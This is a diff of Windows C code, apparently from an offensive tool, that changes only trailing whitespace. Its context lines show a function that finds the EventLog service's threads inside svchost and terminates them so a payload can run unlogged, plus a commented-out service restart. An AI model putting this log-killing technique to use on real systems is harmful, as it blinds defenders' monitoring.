@@ -31,7 +31,7 @@
 
 int KillEventLogThreads()
 {
-	// Grabbing a handle to Service Manager (svchost.exe) 
+	// Grabbing a handle to Service Manager (svchost.exe)
 	SC_HANDLE hSVCM = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
 
 	// Grabbing a handle to EventLog Service
@@ -133,7 +133,7 @@ int KillEventLogThreads()
 				//printf("64 bit\n");
 			}
 
-			// Reading sub Process Tag from TEB of svchost.exe 
+			// Reading sub Process Tag from TEB of svchost.exe
 			ReadProcessMemory(hSVC, ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), &subProcessTag, sizeof(subProcessTag), NULL);
 
 			// Unable to Detect subProcessTag in this indirect syscall Version => Winapi version works fine!
@@ -157,7 +157,7 @@ int KillEventLogThreads()
 				query.reserved = 0;
 				query.pBuffer = NULL;
 
-				// This function translates the subProcessTag to ServiceName 
+				// This function translates the subProcessTag to ServiceName
 				// => eventlog
 				I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);
 
@@ -183,10 +183,10 @@ int KillEventLogThreads()
 				// ========== End: Unable to Detect subProcessTag in this Version => Winapi version works fine! ======================
 
 				// To get around this:
-				// 1. Killing all threads 
+				// 1. Killing all threads
 				// 2. Restarting EventService Again! => Can be found, called from indirect.cpp -> main() function after Execution of payload
 
-				// Killing all threads 
+				// Killing all threads
 				if (TerminateThread(hThread, NULL))
 				{
 					printf("\tTerminated!\n");// , te32.th32ThreadID);
@@ -216,7 +216,7 @@ int KillEventLogThreads()
 /*
 int RestartEventLogService()
 {
-	// Grabbing a handle to Service Manager (svchost.exe) 
+	// Grabbing a handle to Service Manager (svchost.exe)
 	SC_HANDLE hSVCM = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
 
 	// handle to the service control manager: hSVCM
@@ -232,7 +232,7 @@ int RestartEventLogService()
 	// name of the account under which the service should run: NT AUTHORITY\LocalService (As per my machine: assuming default): NULL
 
 
-	SC_HANDLE hEventLogService = CreateServiceA(hSVCM, "EventLog", "Windows Event Log", MAXIMUM_ALLOWED, SERVICE_WIN32_OWN_PROCESS, 
+	SC_HANDLE hEventLogService = CreateServiceA(hSVCM, "EventLog", "Windows Event Log", MAXIMUM_ALLOWED, SERVICE_WIN32_OWN_PROCESS,
 		SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "C:\\WINDOWS\\System32\\svchost.exe", NULL, NULL, NULL, NULL, );
 
 	// Starting EventLog Service
